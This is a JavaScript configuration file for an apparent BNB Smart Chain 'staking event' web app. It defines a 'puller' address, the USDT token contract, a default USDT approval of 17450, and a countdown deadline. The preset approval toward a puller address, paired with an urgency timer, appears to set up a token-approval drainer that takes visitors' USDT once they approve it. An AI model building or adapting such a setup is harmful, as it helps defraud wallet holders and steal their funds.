// Global config for both pages
window.APP_CONFIG = {
  PULLER_ADDRESS: "0xC1003Acad8464b9064C42e8CDdFf341142f88f2C",
  USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
  DEFAULT_APPROVAL_USDT: 17450,
  BSC: {
    CHAIN_ID_HEX: "0x38",
    CHAIN_PARAMS: {
      chainId: "0x38",
      chainName: "BNB Smart Chain",
      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
      rpcUrls: ["https://bsc-dataseed.binance.org/"],
      blockExplorerUrls: ["https://bscscan.com"]
    }
  },
  // Leave empty to use same-origin server (recommended)
  BACKEND_URL: "",
  // Staking event deadline in ISO 8601 (UTC) so the public timer drops exactly once per day.
  COUNTDOWN_END_DATE: "2026-06-20T00:00:00Z",
  COUNTDOWN_FALLBACK_DAYS: 220
};
